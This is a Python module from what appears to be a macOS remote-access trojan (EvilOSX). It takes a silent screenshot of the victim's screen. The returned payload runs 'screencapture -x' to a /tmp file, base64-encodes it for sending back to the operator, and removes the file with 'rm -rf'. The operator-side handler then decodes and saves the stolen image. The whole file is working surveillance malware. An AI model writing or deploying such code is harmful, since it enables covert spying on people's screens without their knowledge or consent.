import uuid
import os
import base64


class Module:
    def __init__(self):
        self.info = {
            "Author": ["Marten4n6"],
            "Description": "Takes a screenshot of the client's screen.",
            "References": []
        }
        self.output_folder = None

    def setup(self, module_view, output_view, successful):
        self.output_folder = module_view.prompt("Output folder (ENTER for output/): ")
        self.output_folder = os.path.expanduser(self.output_folder)

        if not self.output_folder:
            self.output_folder = "output"
            successful.put(True)
        elif not os.path.exists(self.output_folder):
            output_view.add("That folder doesn't exist!", "attention")
            successful.put(False)
        else:
            successful.put(True)

    def run(self):
        return """\
        import base64
        
        output_file = "/tmp/please_not_porn.png"
        
        run_command("screencapture -x %s" % output_file)
        print run_command("base64 %s" % output_file)
        run_command("rm -rf %s" % output_file)
        """

    def process_response(self, output_view, response):
        output_name = str(uuid.uuid4()).replace("-", "")[0:12] + ".png"
        output_file = os.path.join(self.output_folder, output_name)

        if not os.path.exists("output") and self.output_folder == "output":
            os.mkdir("output")
        with open(output_file, "w") as open_file:
            open_file.write(base64.b64decode(response))

        output_view.add("Screenshot saved to: %s" % os.path.realpath(output_file), "info")
